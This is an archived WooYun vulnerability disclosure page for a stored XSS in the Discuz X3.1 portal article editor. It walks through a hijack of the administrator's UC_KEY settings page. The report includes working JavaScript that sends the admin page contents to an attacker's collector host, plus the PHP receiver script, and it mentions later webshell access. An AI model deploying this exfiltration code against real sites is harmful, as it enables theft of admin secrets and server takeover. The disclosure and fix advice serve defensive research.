@@ -1,0 +1,305 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Discuz某处XSS劫持UC_KEY（XSS应用详细过程）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Discuz某处XSS劫持UC_KEY（XSS应用详细过程）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/xfkxfk">xfkxfk</a> 
+</li><li>提交时间：		2014-01-23 16:21</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-23：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-23：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-26：	细节向第三方安全合作伙伴开放<br/>
+									2014-02-02：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-12：	细节向普通白帽子公开<br/>
+									2014-03-04：	细节向实习白帽子公开<br/>
+									2014-04-23：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">Discuz某处XSS劫持UC_KEY到拿webshell。<br />
+XSS应用的详细过程。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><pre><code>漏洞：</code></pre><p class='detail'><br />
+<br />
+这个漏洞的位置在Discuz的门户功能处。<br />
+<br />
+在发表文章时，打开“编辑源码”功能时，写入任意XSS CODE后，再进入和输出都没有过滤。导致存储型XSS。<br />
+<br />
+大家都知道，这里的XSS虽然可以劫持到用户和管理的Cookies，但是没什么用，无法登陆。<br />
+<br />
+那么，我们可以想办法拿XSS来干点其他的，比如劫持管理员后台内容，如UC_KEY等。<br />
+<br />
+<br />
+<br />
+</p><pre><code>门槛：</code></pre><p class='detail'><br />
+<br />
+因为默认安装情况下这个门户功能是没有配置的。<br />
+<br />
+所以管理员需要手动配置门户功能。大部分都会开启门户。<br />
+<br />
+但是开启门户，添加门户频道后不是所有用户都可以发表文章。<br />
+<br />
+发表文章的权限是管理员手动配置的。<br />
+<br />
+一般情况：<br />
+<br />
+1、管理员可以发表文章。<br />
+<br />
+2、超级版主，版主等管理组可以发表文章。<br />
+<br />
+3、普通用户可以发表文章。<br />
+<br />
+4、上述用户发表文章后可以配置需要管理员审核等。<br />
+<br />
+所以，综上所述，只要用户可以发表文章就可以到达目的了。<br />
+<br />
+<br />
+<br />
+</p><pre><code>下面说说详细过程：</code></pre><p class='detail'><br />
+<br />
+首先我们来看下我们目标环境的discuz配置，选择门户——添加频道：<br />
+<br />
+</p><p class="detail"><a href="../images/231512254e81de669c540998bcbea0b6197bee24.png" target="_blank"><img src="../images/231512254e81de669c540998bcbea0b6197bee24.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+然后看看可发表文章的用户组。这里是新手的发表文章文章权限配置。<br />
+<br />
+</p><p class="detail"><a href="../images/23151329a18b5bb55b4bd893d593ab0b8511db40.png" target="_blank"><img src="../images/23151329a18b5bb55b4bd893d593ab0b8511db40.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+可以发表文章，但是需要管理审核。<br />
+<br />
+上述时普遍存在的常规门户文章发表配置。<br />
+<br />
+<br />
+<br />
+然后我们在目标站上注册用户，发表文章：<br />
+<br />
+</p><p class="detail"><a href="../images/231514372d2ef63e27047fd612beb1a1e68f6dc2.png" target="_blank"><img src="../images/231514372d2ef63e27047fd612beb1a1e68f6dc2.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+具体注意的，介绍的部分上图已说明。<br />
+<br />
+这里攻击者服务其上的jquery.js和js.js就是我们劫持UC_KEY的核心。<br />
+<br />
+说白了就是劫持页面源代码。没什么技术含量。<br />
+<br />
+这里我用了ajax请求，为了避免没有jquery环境，自己加上了jquery.js。<br />
+<br />
+js.js代码如下：<br />
+<br />
+</p><pre><code>$(document).ready(function(){<br />
+		var htmlstr = &#039;&#039;;<br />
+		<br />
+		$.ajax({<br />
+			  url: &quot;http://xxx.xxx.100.235/Discuz_X3.1_SC_UTF8/admin.php?action=setting&amp;operation=uc&quot;,<br />
+			  dataType: &quot;text&quot;,<br />
+			  async: false,<br />
+			  success: function(data){<br />
+			  		htmlstr = data;<br />
+			  }	<br />
+		});<br />
+		<br />
+		$.ajax({<br />
+			  url: &quot;http://xxx.xxx.20.198/savepage.php&quot;,<br />
+			  dataType: &quot;text&quot;,<br />
+			  async: false,<br />
+			  type: &quot;POST&quot;,<br />
+			  data: {&quot;msg&quot;: htmlstr},<br />
+			  success: function(data){<br />
+			  		//htmlstr = data;<br />
+			  }	<br />
+		});<br />
+		//$(&quot;body&quot;).append(&quot;&lt;area&gt;&quot;+htmlstr+&quot;&lt;/area&gt;&quot;);<br />
+		//alert(htmlstr)<br />
+});</code></pre><p class='detail'><br />
+<br />
+功能就是劫持目标的http://xxx.xxx.100.235/Discuz_X3.1_SC_UTF8/admin.php?action=setting&amp;operation=uc页面的内容，然后发送到攻击者的http://xxx.xxx.20.198/savepage.php上。<br />
+<br />
+savepage.php就是接受目标页面源码内容的，代码如下：<br />
+<br />
+</p><pre><code>&lt;?php<br />
+$data=$_POST[&#039;msg&#039;];<br />
+$file=&#039;savepage.txt&#039;;<br />
+if (is_writable($file) == false) {<br />
+         die(&#039;123&#039;);<br />
+}<br />
+file_put_contents($file, $data);<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+下面我们来看看我们发表文章后，目标站点上的响应：<br />
+<br />
+</p><p class="detail"><a href="../images/231523055e6bd54f08113008934cb3cb109f6e2b.png" target="_blank"><img src="../images/231523055e6bd54f08113008934cb3cb109f6e2b.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+管理员进入后台就会看见提示。<br />
+<br />
+</p><p class="detail"><a href="../images/23152337a6b81b911313ab95edb36facfededfe0.png" target="_blank"><img src="../images/23152337a6b81b911313ab95edb36facfededfe0.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+打开需要审核的内容，管理员在审核时一般都会看看这个文章的内容，是否可以发布。<br />
+<br />
+此时管理员查看时，已经被我们劫持。<br />
+<br />
+</p><p class="detail"><a href="../images/23152441366f63fd515c52be59a4dcece2bb44bc.png" target="_blank"><img src="../images/23152441366f63fd515c52be59a4dcece2bb44bc.png" alt="6.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+最后我们回到攻击者，看看我们接收到的内容：<br />
+<br />
+</p><p class="detail"><a href="../images/23152512bb825cec87180f35dd1884bfb41c3c28.png" target="_blank"><img src="../images/23152512bb825cec87180f35dd1884bfb41c3c28.png" alt="7.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+剩下的就是利用UC_KEY直接拿shell，或者登陆后台，这里的内容见其他漏洞详情。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">上一张攻击值劫持到的内容：<br />
+<br />
+</p><p class="detail"><a href="../images/2315280315ad955893fb812f72a6d8bce8e7c50a.png" target="_blank"><img src="../images/2315280315ad955893fb812f72a6d8bce8e7c50a.png" alt="7.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1、这里在正常发表文章时，是没有问题的，已经对内容进行了转义。这里继续转义过滤即可。<br />
+<br />
+2、我们在劫持内容时，Referer是从前台进入的。虽然是管理登陆的，从前台直接转入后台时需要管理账户密码的。就像管理员虽然登陆的前台，但是在转入后台是依然需要输入用户名密码一样。<br />
+<br />
+3、控制后台敏感内容的二次利用及危害。<br />
+<br />
+4、其他。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/xfkxfk" title="xfkxfk">xfkxfk</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-049656" title="Discuz某处XSS劫持UC_KEY（XSS应用详细过程）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2014-01-23 16:50</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">确切的来说，算不上漏洞，因为从功能角度来讲就是这么设计的。不过，还是很感谢您提出的问题。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="49656";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
